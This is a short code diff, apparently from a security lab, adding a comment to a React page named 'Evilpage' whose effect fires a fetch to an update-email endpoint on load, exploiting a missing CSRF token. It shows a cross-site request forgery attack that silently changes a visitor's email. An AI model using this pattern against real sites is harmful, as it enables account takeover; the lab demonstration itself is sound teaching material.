@@ -1,6 +1,8 @@
 "use client"
 import { useEffect } from "react";
 
+// update the email of the user automatically when the user visits this page . its due to no usage of csrf token.
+
 export default function Evilpage() {
     useEffect(() => {
       fetch("/api/lab-user/update-email",{
